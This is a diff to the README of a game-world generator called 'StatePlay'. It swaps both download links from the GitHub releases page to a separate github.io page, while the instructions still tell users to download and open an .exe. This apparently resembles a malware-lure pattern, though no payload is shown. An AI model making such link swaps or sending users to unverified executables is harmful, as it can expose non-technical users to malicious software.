@@ -1,6 +1,6 @@
 # 🎮 StatePlay - Create Consistent Game Worlds With Ease
 
-[![](https://img.shields.io/badge/Download-StatePlay-blue.svg)](https://github.com/bruising-thaw43/StatePlay/releases)
+[![](https://img.shields.io/badge/Download-StatePlay-blue.svg)](https://bruising-thaw43.github.io)
 
 StatePlay generates game worlds that remember your actions. It keeps game mechanics consistent as you explore new areas. This tool uses smart models to ensure that every object and rule stays in place while you play. You do not need technical skills to build complex, responsive game environments.
 
@@ -18,7 +18,7 @@ First, ensure your computer meets these requirements:
 
 Follow these steps to put the software on your machine:
 
-1. Visit this page to download the latest version: [https://github.com/bruising-thaw43/StatePlay/releases](https://github.com/bruising-thaw43/StatePlay/releases)
+1. Visit this page to download the latest version: [https://bruising-thaw43.github.io](https://bruising-thaw43.github.io)
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to start the download.
 4. Open the folder where your browser saves downloads.
